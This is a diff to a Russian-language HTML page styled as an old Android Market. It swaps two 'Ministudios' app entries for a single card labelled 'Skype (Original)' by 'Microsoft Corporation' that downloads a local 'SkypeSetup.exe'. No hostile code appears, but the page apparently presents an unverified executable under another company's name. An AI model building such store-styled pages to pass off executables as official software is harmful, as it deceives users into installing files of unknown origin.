@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Android Market - Ministudios</title>
+    <title>Android Market - Скачать Skype</title>
     <style>
         body {
             background-color: #eeeeee;
@@ -12,7 +12,6 @@
             padding: 0;
         }
 
-        /* Шапка */
         header {
             background: linear-gradient(to bottom, #98c01d 0%, #82a513 100%);
             color: white;
@@ -22,89 +21,57 @@
             border-bottom: 2px solid #6d8a10;
         }
 
-        .logo-text {
-            font-size: 20px;
-            font-weight: bold;
-            text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
-        }
+        .logo-text { font-size: 20px; font-weight: bold; }
 
-        /* Навигация */
-        nav {
-            background: #323232;
-            display: flex;
-        }
-
+        nav { background: #323232; display: flex; }
         nav div {
-            flex: 1;
-            text-align: center;
-            padding: 12px 0;
-            color: #bbbbbb;
-            font-size: 13px;
-            font-weight: bold;
-            text-transform: uppercase;
-            cursor: pointer;
+            flex: 1; text-align: center; padding: 12px 0;
+            color: #bbbbbb; font-size: 13px; font-weight: bold; text-transform: uppercase;
         }
+        nav div.active { color: white; background: #404040; border-bottom: 3px solid #98c01d; }
 
-        nav div.active {
-            color: white;
-            background: #404040;
-            border-bottom: 3px solid #98c01d;
-        }
+        .app-list { padding: 8px; }
 
-        /* Список */
-        .app-list {
-            padding: 8px;
-        }
-
+        /* Стиль карточки-ссылки на скачивание */
         .app-item {
             background: white;
             border: 1px solid #d0d0d0;
             margin-bottom: 4px;
             display: flex;
-            padding: 10px;
+            padding: 12px;
             align-items: center;
-            text-decoration: none; /* Убираем подчеркивание ссылки */
+            text-decoration: none;
             color: inherit;
         }
 
-        .app-item:active {
-            background-color: #e0e0e0; /* Эффект нажатия */
-        }
+        .app-item:hover { background-color: #f9f9f9; border-color: #98c01d; }
 
         .app-icon {
             width: 52px;
             height: 52px;
-            background: #f5f5f5;
-            border: 1px solid #e0e0e0;
+            background: #00aff0; /* Цвет Skype */
             margin-right: 12px;
             border-radius: 6px;
-            object-fit: cover;
-        }
-
-        .app-details {
-            flex-grow: 1;
-        }
-
-        .app-name {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
             font-weight: bold;
-            font-size: 16px;
-            color: #222;
-            margin-bottom: 2px;
+            font-size: 24px;
         }
 
-        .app-sub {
-            color: #777;
-            font-size: 13px;
-        }
+        .app-details { flex-grow: 1; }
+        .app-name { font-weight: bold; font-size: 16px; color: #222; }
+        .app-sub { color: #777; font-size: 12px; }
 
-        .price-tag {
+        .download-btn {
             background: #e8e8e8;
             border: 1px solid #cccccc;
-            padding: 4px 10px;
-            font-size: 14px;
+            padding: 6px 12px;
+            font-size: 12px;
             font-weight: bold;
             color: #444;
-            border-radius: 2px;
+            text-transform: uppercase;
         }
     </style>
 </head>
@@ -116,27 +83,18 @@
 
 <nav>
     <div class="active">Приложения</div>
-    <div>Игры</div>
+    <div>Загрузки</div>
 </nav>
 
 <div class="app-list">
 
-    <a href="pl_messenger.html" class="app-item">
-        <img src="pl_icon.png" alt="PL" class="app-icon">
+    <a href="SkypeSetup.exe" class="app-item" download>
+        <div class="app-icon">S</div>
         <div class="app-details">
-            <div class="app-name">PL Messenger</div>
-            <div class="app-sub">Ministudios</div>
+            <div class="app-name">Skype (Original)</div>
+            <div class="app-sub">Microsoft Corporation</div>
         </div>
-        <div class="price-tag">Бесплатно</div>
-    </a>
-
-    <a href="skyper.html" class="app-item">
-        <img src="skyper_icon.png" alt="S" class="app-icon">
-        <div class="app-details">
-            <div class="app-name">Skyper 2012</div>
-            <div class="app-sub">Ministudios</div>
-        </div>
-        <div class="price-tag">Бесплатно</div>
+        <div class="download-btn">Скачать</div>
     </a>
 
 </div>
